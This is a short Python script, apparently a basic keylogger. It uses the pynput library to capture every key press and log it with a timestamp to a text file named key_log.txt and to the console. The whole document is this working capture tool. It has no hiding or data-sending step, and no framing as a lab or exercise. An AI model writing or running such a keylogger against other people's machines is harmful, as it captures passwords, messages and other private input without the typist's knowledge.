import logging
from pynput import keyboard

#Set up logging to write to a file and print to console
log_file= "key_log.txt"
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s: %(message)s')
logger= logging.getLogger()

#File handler
file_handler= logging.FileHandler(log_file)
file_handler.setLevel(logging.DEBUG)
file_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
logger.addHandler(file_handler)

#Console handler for debugging
console_handler= logging.StreamHandler()
console_handler.setLevel(logging.DEBUG)
console_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
logger.addHandler(console_handler)

def on_press(key):
    try:
        logger.info(f"Key pressed: {key.char}")
    except AttributeError:
        logger.info(f"Special key pressed: {key}")

try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except Exception as e:
    logger.error(f"Error: {e}")